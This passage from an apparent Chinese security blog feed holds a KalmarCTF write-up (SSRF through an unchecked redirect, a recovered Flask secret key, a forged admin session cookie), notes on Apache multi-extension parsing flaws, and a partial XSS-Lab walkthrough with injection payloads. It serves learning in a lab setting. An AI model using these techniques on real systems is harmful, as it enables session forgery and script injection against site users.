class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, send_from_directory, session, abort</span><br><span class="line"><span class="keyword">from</span> requestlib <span class="keyword">import</span> fetch</span><br><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> session_encryption_key</span><br><span class="line"><span class="keyword">import</span> subprocess, os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">protect_secrets</span>():</span><br><span class="line">    os.unlink(<span class="string">&quot;config.py&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_url</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(url, <span class="built_in">str</span>) <span class="keyword">or</span> <span class="built_in">len</span>(url) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">&quot;Please provide a regular url!&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url.startswith(<span class="string">&quot;https://&quot;</span>) <span class="keyword">or</span> url.lstrip() != url:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">&quot;Url must start with &#x27;https://&#x27;. We do not want anything insecure here!&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span>, <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">app = Flask(__name__, static_folder=<span class="string">&#x27;static&#x27;</span>, static_url_path=<span class="string">&#x27;/assets/&#x27;</span>)</span><br><span class="line">app.secret_key = session_encryption_key</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Using key: &quot;</span>, app.secret_key)</span><br><span class="line"></span><br><span class="line">protect_secrets()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    <span class="keyword">return</span> send_from_directory(<span class="string">&#x27;pages&#x27;</span>, <span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">healthcheck</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&quot;admin&quot;</span>) == <span class="literal">True</span>: <span class="comment">#</span></span><br><span class="line">        <span class="keyword">return</span> subprocess.check_output(<span class="string">&quot;/readflag&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> abort(<span class="number">403</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/check&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>():</span><br><span class="line">    url = request.form.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    valid, err = check_url(url)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> valid:</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span>: <span class="literal">False</span>,</span><br><span class="line">            <span class="string">&#x27;error&#x27;</span>: err</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="literal">True</span>:</span><br><span class="line">        content = fetch(url)</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span>: <span class="literal">True</span>,</span><br><span class="line">            <span class="string">&#x27;online&#x27;</span>: content != <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&#x27;content&#x27;</span>: content</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">10600</span>, debug=<span class="literal">False</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>但是这里面<code>requestlib</code>库文件是我们安装不了的，尝试直接读取一下<code>requestlib.py</code>查看是不是自己写的库，同样的也是读到了这个文件，经过美化后如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen, HTTPErrorProcessor, build_opener, Request</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NoRedirection</span>(<span class="title class_ inherited__">HTTPErrorProcessor</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">http_response</span>(<span class="params">self, request, response</span>):</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">    https_response = http_response</span><br><span class="line"></span><br><span class="line">install_opener(build_opener(NoRedirection()))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fetch</span>(<span class="params">url, follow_redirects=<span class="literal">True</span></span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Avoid endless redirect loops</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;requestlib 2.9-alpha&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    req = Request(url, headers=headers)</span><br><span class="line">    <span class="keyword">with</span> urlopen(req) <span class="keyword">as</span> res:</span><br><span class="line">        redirect_url = res.headers.get(<span class="string">&quot;Location&quot;</span>))</span><br><span class="line">        <span class="keyword">if</span> redirect_url <span class="keyword">and</span> follow_redirects:</span><br><span class="line">            <span class="keyword">return</span> fetch(redirect_url, follow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(res.read())[<span class="number">2</span>:-<span class="number">1</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h4><p>在定义的<code>fetch</code>函数中<code>follow_redirects</code>值默认为<code>True</code>，并且跟随响应包中的<code>Location</code>键值进行判断是否存在重定向，重定向的目标是何。但由于只限制了第一次输入的网址为<code>https://</code>,并<strong>未进行对重定向的协议进行检查</strong>从而造成了<code>SSRF</code></p><details class="folding-tag" ><summary> 如何处理重定向 </summary>              <div class='content'>              <p><strong>注意：</strong></p><p>如浏览器，powershell中的curl再处理重定向时，无法处理从<code>https://</code>重定向至<code>file://</code></p><p>powershell中的curl发生报错</p><p><img src="/./KalmarCTF-Web-Replay/3f38953983e9ec433be5d50aee943d1f.png" alt="3f38953983e9ec433be5d50aee943d1f"></p><p>浏览器会提示页面错误</p><p><img src="/./KalmarCTF-Web-Replay/4fb256abd0148e6f540cc518868c64bb.png" alt="4fb256abd0148e6f540cc518868c64bb"></p>              </div>            </details><p>做到这里，<strong>关键其实是为造出一个session</strong>，其键值存在<code>admin: True</code>,但存有<code>session_encryption_key</code>的<code>config.py</code>再被调用后就被删除了,需要找到如何复原的办法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&#x27;/flag&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def healthcheck():</span><br><span class="line">    if session.get(&quot;admin&quot;) == True: #</span><br><span class="line">        return subprocess.check_output(&quot;/readflag&quot;)</span><br><span class="line">    else:</span><br><span class="line">        return abort(403)</span><br></pre></td></tr></table></figure><h4 id="pycache-文件夹"><a href="#pycache-文件夹" class="headerlink" title="__pycache__文件夹"></a><code>__pycache__</code>文件夹</h4><blockquote><p>在Python工作目录下，如果执行某文件后经常会自动生成一个<code>__pycache__</code>文件夹。<code>__pycache__</code>文件夹正是缓存*<code>.pyc</code>地方。<code>*.pyc</code>文件的命名格式是<code>&lt;module&gt;.&lt;interpreter_version&gt;.pyc</code>。<strong>注意，对于被导入（<code>import</code>）的module才会生成对应的<code>*.pyc</code>文件</strong></p><p>详细文档可参考：</p><p><a href="https://zhuanlan.zhihu.com/p/476772186">【Python】__pycache__文件夹是什么东西？ - 知乎 (zhihu.com)</a></p><p><a href="https://blog.csdn.net/yitiaodashu/article/details/79023987">pyhton中__pycache__文件夹的产生与作用_pycache文件夹下的东西是如何产生的-CSDN博客</a></p><p>例子：</p><p>以被导入的为<code>config.py</code>文件为例，最后生成在<code>__pycache__</code>文件夹<code>config.cpython-35.pyc</code>，最开始的<code>config</code>为被导入的文件名，<code>cpython</code>代表的是c语言实现的Python解释器，<code>-35</code>代表的是版本为3.5版。</p></blockquote><p>因此，我们可以在<code>__pycache__</code>文件夹中找到config的<code>.pyc</code>文件，再进行逆向</p><p>最后测试到路径为：<code>/var/www/keep-dreaming-sonny-boy/__pycache__/config.cpython-311.pyc</code>，里面的内容为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\xa7\\r\\r\\n\\x00\\x00\\x00\\x00\\x86\\x84\\xf7e;\\x00\\x00\\x00\\xe3\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xf3\\n\\x00\\x00\\x00\\x97\\x00d\\x00Z\\x00d\\x01S\\x00)\\x02\\xda Rm7GbQJ4uDikyiis6miD7YwsN11rEjfLN)\\x01\\xda\\x16session_encryption_key\\xa9\\x00\\xf3\\x00\\x00\\x00\\x00\\xfa*/var/www/keep-dreaming-sonny-boy/config.py\\xfa\\x08&lt;module&gt;r\\x07\\x00\\x00\\x00\\x01\\x00\\x00\\x00s\\x11\\x00\\x00\\x00\\xf0\\x03\\x01\\x01\\x01\\xd8\\x19;\\xd0\\x00\\x16\\xd0\\x00\\x16\\xd0\\x00\\x16r\\x05\\x00\\x00\\x00</span><br></pre></td></tr></table></figure><p>由于转化为json后转义字符<code>\</code>会变成<code>\\</code>,叫狗屁通写一个小小的脚本把以上数据恢复成二进制数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">data_str = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">\\xa7\\r\\r\\n\\x00\\x00\\x00\\x00\\x86\\x84\\xf7e;\\x00\\x00\\x00\\xe3\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xf3\\n\\x00\\x00\\x00\\x97\\x00d\\x00Z\\x00d\\x01S\\x00)\\x02\\xda Rm7GbQJ4uDikyiis6miD7YwsN11rEjfLN)\\x01\\xda\\x16session_encryption_key\\xa9\\x00\\xf3\\x00\\x00\\x00\\x00\\xfa*/var/www/keep-dreaming-sonny-boy/config.py\\xfa\\x08&lt;module&gt;r\\x07\\x00\\x00\\x00\\x01\\x00\\x00\\x00s\\x11\\x00\\x00\\x00\\xf0\\x03\\x01\\x01\\x01\\xd8\\x19;\\xd0\\x00\\x16\\xd0\\x00\\x16\\xd0\\x00\\x16r\\x05\\x00\\x00\\x00</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># 将字符串中的转义序列转换为相应的二进制数据</span></span><br><span class="line">binary_data = <span class="built_in">bytes</span>(data_str, <span class="string">&quot;utf-8&quot;</span>).decode(<span class="string">&quot;unicode_escape&quot;</span>).encode(<span class="string">&quot;latin1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存到文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;output_binary_data.txt&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(binary_data)</span><br></pre></td></tr></table></figure><p><code>.pyc</code>文件的逆向在网上就很多在线的工具可以进行使用，逆向后得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># visit https://tool.lu/pyc/ for more information</span><br><span class="line"># Version: Python 3.11</span><br><span class="line"></span><br><span class="line">session_encryption_key = &#x27;Rm7GbQJ4uDikyiis6miD7YwsN11rEjfL&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>再使用session伪造工具<code>flask-session-cookie-manager</code>为造出一个session出来，指令为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py encode -s &#x27;Rm7GbQJ4uDikyiis6miD7YwsN11rEjfL&#x27; -t &quot;&#123;&#x27;admin&#x27;:True&#125;&quot;</span><br></pre></td></tr></table></figure><p>最后得到伪造的session所对应的cookie为：<code>eyJhZG1pbiI6dHJ1ZX0.ZgBMeg.t2OWSLBvEeZpMPUZNBFFcmsFS-o</code>，手动填入浏览器中，并访问&#x2F;flag</p><p><img src="/./KalmarCTF-Web-Replay/4ac0b231a81aeef5ed48fde37b6f6650.png" alt="4ac0b231a81aeef5ed48fde37b6f6650"></p><p>最后得到flag：<code>kalmar&#123;Rem3Mbr_T0_fl0sh!&#125;</code></p><details class="folding-tag" ><summary> 查看Wells的丢人过程 </summary>              <div class='content'>              <p>我想着不是伪造出session最后的结果时运行<code>/readflag</code>这个可执行文件，便尝试读取了一下，转化为二进制，再发给逆向的同学看看能不能找出flag<strong>位于哪里命名为什么</strong>直接读取出来</p><p>也确实逆向出来，找到了flag的位置以及名称</p><p><img src="/./KalmarCTF-Web-Replay/3e0b6376b99ca459bfbfb08201947ec8.png" alt="3e0b6376b99ca459bfbfb08201947ec8"></p><p>但出题人也估计想到了这一点，位于<code>flag.txt</code>设置了权限，没法被直接读取出来。。。。。。。</p><p><strong>跪谢逆向的同学：L0SJ0K</strong></p>              </div>            </details><h1 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h1><ul><li><a href="https://ireland.re/posts/KalmarCTF_2024/">https://ireland.re/posts/KalmarCTF_2024/</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;前言：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;靶场链接：&lt;a href=&quot;https://kalmarc.tf/challenges&quot;&gt;https://kalmarc.tf/challenges&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;难度太大了根本写不出</summary>
      
    
    
    
    <category term="CTF" scheme="https://we11s.github.io/categories/CTF/"/>
    
    
    <category term="CTF-WriteUp" scheme="https://we11s.github.io/tags/CTF-WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>中间件漏洞</title>
    <link href="https://we11s.github.io/posts/2304588875/"/>
    <id>https://we11s.github.io/posts/2304588875/</id>
    <published>2024-03-12T13:55:33.000Z</published>
    <updated>2024-03-18T10:35:43.886Z</updated>
    
    <content type="html"><![CDATA[<h1 id="施工中"><a href="#施工中" class="headerlink" title="施工中"></a>施工中</h1><p><img src="/img/edit.png" alt="施工中"></p><h1 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h1><p>2.0-2.2版本存在个漏洞 CE-2012-0053:</p><p>攻击者可通过向网站植人超大的Cookie,令其HTTP头超过Apache的LititRequestFieldSize (最大请求长度，4192字节)，使得Apache返回400错误，状态页中包含了HttpOnly 保护的Cookie。</p><p><a href="https://httpd.apache.org/docs/2.4/zh-cn/mod/core.html#sethandler">core - Apache HTTP Server 版本 2.4</a></p><h2 id="Apache解析配置漏洞-多后缀名解析配置漏洞"><a href="#Apache解析配置漏洞-多后缀名解析配置漏洞" class="headerlink" title="Apache解析配置漏洞\多后缀名解析配置漏洞"></a>Apache解析配置漏洞\多后缀名解析配置漏洞</h2><h3 id="解析配置漏洞简介"><a href="#解析配置漏洞简介" class="headerlink" title="解析配置漏洞简介"></a>解析配置漏洞简介</h3><p>此漏洞实际为<strong>人为的错误配置导致的漏洞</strong>，与Apache本身无关。</p><p><strong>Apache对于多后缀文件的处理规则是</strong>：<a href="https://httpd.apache.org/docs/2.4/zh-cn/mod/mod_mime.html#multipleext">Files with Multiple Extensions-mod_mime</a></p><details class="folding-tag" ><summary> 对应的翻译 </summary>              <div class='content'>              <blockquote><p>元数据指扩展名映射到关于语言、内容类型、字符集或编码的信息   原文： <em>metadata (language, content type, character set or encoding)</em> </p><p>文件可以有多个扩展名；扩展名的顺序通常是无关紧要的。例如，如果文件 welcome.html.fr 映射到内容类型 text&#x2F;html 和法语，则文件 welcome.fr.html 会映射到完全相同的信息。如果给出了多个映射到相同类型元数据的扩展名，则右边的扩展名将被使用，语言和内容编码除外。例如，如果 .gif 映射到媒体类型 image&#x2F;gif，而 .html 映射到媒体类型 text&#x2F;html，则文件 welcome.gif.html 将与媒体类型 text&#x2F;html 关联。</p><p>语言和内容编码被视为累积的，因为可以为特定资源分配不止一种语言或编码。例如，文件 welcome.html.en.de 将以 Content-Language: en, de 和 Content-Type: text&#x2F;html 交付。</p><p>当一个具有多个扩展名的文件同时与媒体类型和处理程序关联时，应该小心处理。这通常会导致请求由与处理程序关联的模块处理。例如，如果 .imap 扩展名映射到处理程序 imap-file（来自 mod_imagemap），而 .html 扩展名映射到媒体类型 text&#x2F;html，则文件 world.imap.html 将同时与 imap-file 处理程序和 text&#x2F;html 媒体类型关联。处理时，将使用 imap-file 处理程序，因此它将被视为一个 mod_imagemap 图像映射文件。</p><p>如果你希望只有文件名中最后一个点分隔的部分映射到特定的元数据，那么不要使用 Add* 指令。例如，如果你希望文件 foo.html.cgi 被处理为 CGI 脚本，但不希望文件 bar.cgi.html 如此处理，那么不要使用 AddHandler cgi-script .cgi，而是使用</p><p>仅基于最终扩展名SetHandler配置处理程序</p></blockquote><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;FilesMatch <span class="string">&quot;[^.]+\.cgi$&quot;</span>&gt;</span></span><br><span class="line">  <span class="attribute">SetHandler</span> cgi-script</span><br><span class="line"><span class="section">&lt;/FilesMatch&gt;</span></span><br></pre></td></tr></table></figure>              </div>            </details><p>Apache对多后缀文件的识别概括来说为：</p><ol><li>Apache允许<strong>文件有多个扩展名</strong>，并且会<strong>将所有后缀名进行识别</strong>，识别的顺序为：<strong>从右到左</strong><ul><li>如： <code>.html.fr</code> 映射到 <code>Content-Type: text/html</code> 和<code>Content-Language: de</code>。</li></ul></li><li>Apache允许扩展名映射到元数据(包括：语言、内容类型、字符集或编码)、处理程序。<ul><li>如 <code>.html</code> 映射到 <code>Content-Type: text/html</code>。</li></ul></li><li>对于<strong>相同类型元数据，以从右到左第一个出现的为准</strong>，但对于<code>语言和内容编码</code>可累积的元数据，将会<strong>叠加</strong>。<ul><li>如：.<code>gif.html</code>根据此规则映射到 <code>Content-Type: text/html</code>。</li><li>​      <code>.html.en.de</code>根据此规则映射到<code>Content-Language: en, de</code> 和 <code>Content-Type: text/html</code></li></ul></li><li>由于映射到处理程序和映射媒体类型，最后的<strong>返回结果</strong>不一致（<em>一个为经过程序处理，一个为返回媒体文件</em>）。当出现不同扩展名映射到处理程序和媒体类型时，<strong>映射到处理程序的优先等级高于映射到媒体类型</strong><ul><li>如：<code>.imap.html</code>扩展名<code>.imap</code> 映射到处理程序 <code>imap-file</code>， <code>.html</code> 映射到<code>Content-Type: text/html</code> ，根据上述原则，<code>.imap.html</code>文件会被<code>imap-file</code>程序处理</li></ul></li></ol><details class="folding-tag" ><summary> 一点我的理解 </summary>              <div class='content'>              <p><strong>按我的理解：元数据（metadata）是用于指示文件的类型或处理方式</strong></p><p>这里我把元数据（metadata）的定义包括了处理方式，根据一下段落合理的进行拓展定义</p><blockquote><p>If you would prefer only the last dot-separated part of the filename to be mapped to a particular piece of meta-data, then do not use the <code>Add*</code> directives. For example, if you wish to have the file <code>foo.html.cgi</code> processed as a CGI script, but not the file <code>bar.cgi.html</code>, then instead of using <code>AddHandler cgi-script .cgi</code></p><p>如果你希望只有文件名中最后一个点分隔的部分映射到特定的元数据，那么不要使用 Add* 指令。例如，如果你希望文件 foo.html.cgi 被处理为 CGI 脚本，但不希望文件 bar.cgi.html 如此处理，那么不要使用 AddHandler cgi-script .cgi</p></blockquote><p><strong>因此当出现多个映射到处理程序，会按照从右到左第一个出现的为准，进行处理程序</strong></p>              </div>            </details><p><strong>使用</strong> <code>Add*</code> <strong>指令，Apache处理一个文件时会应用上述规则</strong></p><p><code>Add*</code> 指令指的是如：<code>AddType</code>、<code>AddDefaultCharset</code>、<code>AddEncoding</code>、<code>AddHandler</code>、<code>AddOutputFilter</code>、<code>AddLanguage</code>、<code>AddCharset</code>等指令，其中<code>AddHandler</code>设置<strong>对应后缀名映射到处理程序</strong>，如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler application/x-httpd-php .php</span><br></pre></td></tr></table></figure><div class="note warning simple"><p>由此，当用户上传一个<code>a.php.jpg</code>文件时，Apace的配置文件中包含<code>AddHandler</code>处理PHP文件，且未对上传后的文件进行重命名，此时<code>a.php.jpg</code><strong>被解析为一个PHP脚本</strong>，解析漏洞由此而来</p></div><h3 id="解析配置漏洞条件"><a href="#解析配置漏洞条件" class="headerlink" title="解析配置漏洞条件"></a>解析配置漏洞条件</h3><ul><li>文件没有被重命名</li><li>Apache中配置中含有<code>AddHandler</code>的设置</li></ul><h3 id="解析配置漏洞解决办法"><a href="#解析配置漏洞解决办法" class="headerlink" title="解析配置漏洞解决办法"></a>解析配置漏洞解决办法</h3><ul><li>将上传的文件进行重命名</li><li>根据官方文档的说明，可以使用<code>SetHandler</code>指令来代替<code>AddHandler</code>，因为<code>SetHandler</code><strong>仅根据最右端的后缀名来判断映射的处理程序</strong></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;施工中&quot;&gt;&lt;a href=&quot;#施工中&quot; class=&quot;headerlink&quot; title=&quot;施工中&quot;&gt;&lt;/a&gt;施工中&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;/img/edit.png&quot; alt=&quot;施工中&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;Apache&quot;&gt;&lt;a href=&quot;#</summary>
      
    
    
    
    <category term="CTF" scheme="https://we11s.github.io/categories/CTF/"/>
    
    
    <category term="CTF-Web" scheme="https://we11s.github.io/tags/CTF-Web/"/>
    
    <category term="Web-Middleware" scheme="https://we11s.github.io/tags/Web-Middleware/"/>
    
  </entry>
  
  <entry>
    <title>XSS-Lab题解</title>
    <link href="https://we11s.github.io/posts/1041826382/"/>
    <id>https://we11s.github.io/posts/1041826382/</id>
    <published>2024-03-05T11:38:03.000Z</published>
    <updated>2024-03-24T03:39:31.856Z</updated>
    
    <content type="html"><![CDATA[<h1 id="施工中"><a href="#施工中" class="headerlink" title="施工中"></a>施工中</h1><p><img src="/img/edit.png" alt="施工中"></p><h1 id="XSS-LAB题解"><a href="#XSS-LAB题解" class="headerlink" title="XSS-LAB题解"></a>XSS-LAB题解</h1><h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><p>观察playroad与页面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/level1.php?name=test</span><br></pre></td></tr></table></figure><p>页面内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">欢迎来到level1</span><br><span class="line">欢迎用户test</span><br></pre></td></tr></table></figure><p>尝试在<code>name=</code>后插入xss语句<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，即</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/level1.php?name=&lt;script&gt;alert(&#x27;heiheihei&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>成功触发XSS，进入下一关</p><h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><p>中间存在个搜索框，尝试直接写入语句<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，查看服务端处理后的页面源代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1 align=center&gt;欢迎来到level2&lt;/h1&gt;</span><br><span class="line">&lt;h2 align=center&gt;没有找到和&amp;lt;script&amp;gt;alert(&#x27;heiheihei&#x27;)&amp;lt;/script&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt;</span><br><span class="line">&lt;form action=level2.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&lt;script&gt;alert(&#x27;heiheihei&#x27;)&lt;/script&gt;&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;</span><br></pre></td></tr></table></figure><p>发现正文部分的回显都被html实体编码处理，但在搜索栏处存在着<code>value=&quot;&lt;script&gt;alert(&#39;heiheihei&#39;)&lt;/script&gt;&quot;</code>，因此可以进行构造闭合语句，<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>，返回后的页面代码在拼接处理后为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=&quot;&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>成功触发XSS，进入下一关</p><h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p>通用的中间存在个搜索框，使用探测语句进行查看可以进行哪些操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2 align=center&gt;没有找到和&amp;lt;script&amp;gt; &amp;lt;/script&amp;gt; &amp;lt;Script&amp;gt; &amp;lt;/Script&amp;gt; &amp;lt;scrscriptipt&amp;gt; &amp;lt;SCRscriptIPT&amp;gt; &#x27; &amp;quot; () Onerror onerror javascript: JavaScript: &amp;lt;!-- --&amp;gt; eval() &amp;lt;a&amp;gt;  &amp;lt;img&amp;gt;  &amp;lt;iframe&amp;gt; &amp;lt;form&amp;gt; src &#123;&#125; / 相关的结果.&lt;/h2&gt;&lt;center&gt;</span><br><span class="line">&lt;form action=level3.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&#x27;&amp;lt;script&amp;gt; &amp;lt;/script&amp;gt; &amp;lt;Script&amp;gt; &amp;lt;/Script&amp;gt; &amp;lt;scrscriptipt&amp;gt; &amp;lt;SCRscriptIPT&amp;gt; &#x27; &amp;quot; () Onerror onerror javascript: JavaScript: &amp;lt;!-- --&amp;gt; eval() &amp;lt;a&amp;gt;  &amp;lt;img&amp;gt;  &amp;lt;iframe&amp;gt; &amp;lt;form&amp;gt; src &#123;&#125; / &#x27;&gt;</span><br></pre></td></tr></table></figure><p>发现<code>&lt; &gt; 